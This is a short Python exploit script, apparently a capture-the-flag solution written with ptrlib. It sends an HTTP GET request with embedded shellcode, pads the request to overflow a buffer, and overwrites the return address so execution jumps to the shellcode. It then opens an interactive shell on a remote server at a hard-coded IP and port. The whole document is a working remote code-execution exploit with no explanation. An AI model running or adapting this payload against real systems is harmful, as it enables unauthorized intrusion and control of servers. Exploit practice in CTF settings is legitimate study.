from ptrlib import *

#sock = Socket("localhost", 8888)
sock = Socket("34.82.101.212", 8001)
addr_shellcode = 0x600a94 + 2
with open("shellcode.o", "rb") as f:
    f.seek(0x180)
    shellcode = f.read(0x100)
    shellcode = shellcode[:shellcode.index(b'EOF')]

payload = b"GET /"
payload += shellcode
payload += b"A" * (1000 - len(payload))
payload += p64(0)
payload += p64(addr_shellcode)
sock.sendline(payload)

sock.interactive()
